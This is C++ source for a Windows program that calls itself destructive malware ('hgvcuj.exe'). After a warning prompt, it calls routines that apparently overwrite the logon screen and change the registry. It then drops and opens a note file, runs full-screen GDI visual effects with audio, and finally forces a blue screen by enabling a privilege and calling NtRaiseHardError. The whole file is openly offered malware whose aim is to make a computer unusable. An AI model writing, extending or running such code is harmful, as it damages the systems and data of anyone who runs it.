#include "GDI.h"
#include <windows.h>
#include <winternl.h>
#include <cstdlib>
#include <ctime>
#include <shellapi.h>
#include <string>
#include "logon.hpp"
#include "registry.h"

#include <bytebeat.hpp>
#include <stages.hpp>

typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

void febypass(){ // blue screen of death
    BOOLEAN bEnabled;
    ULONG uResp;

    HMODULE hNtdll = LoadLibraryA("ntdll.dll");

    auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
    auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");

    RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);

    NtRaiseHardError(0xc0000022, 0, 0, NULL, 6, &uResp);
}

int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int) {
  if (MessageBoxW(nullptr, 
    L"Are you sure you want to run hgvcuj.exe? This application is DESTRUCTIVE MALWARE and WILL MAKE YOUR COMPUTER UNUSABLE. The creators of this malware are not responsible for any damages to your device. Proceed at your own risk.",
    L"hgvcuj.exe",
    MB_YESNO | MB_ICONWARNING) == IDNO )
  {
    return 0;
  }

  Bytebeat bb;

  char tmpDir[MAX_PATH] = {};
  char tmpPath[MAX_PATH] = {};
  GetTempPathA(MAX_PATH, tmpDir);
  lstrcatA(tmpDir, "hgvcuj.txt");
  lstrcpyA(tmpPath, tmpDir);

  overwritelogon();
  Sleep(1500);
  applyreg(true);
  std::string msg = "hgvcuj";
  DWORD wb = 0;
  HANDLE note = CreateFileA(tmpPath, GENERIC_READ | GENERIC_WRITE,FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
  
  if (note == INVALID_HANDLE_VALUE)
    ExitProcess(4);
  if (!WriteFile(note, msg.c_str(), (DWORD)msg.size(), &wb, nullptr))
    ExitProcess(5);
  CloseHandle(note);
  ShellExecuteA(nullptr, "open", "notepad.exe", tmpPath, nullptr, SW_SHOWDEFAULT);

  Sleep(7000);

  srand((unsigned)time(nullptr));
  GDIInit();

  HDC hdc = GetDC(nullptr);
  DWORD start = GetTickCount();

  StageManager stages(26.f);

  while (true)
  {
    float t = (GetTickCount() - start) / 1000.f;
    stages.update(hdc, t, bb);
    
    if (stages.is_finished()) {
        Sleep(15000);
        febypass();
        ExitProcess(0); 
    }

    Sleep(8);
  }

  return 0;
}
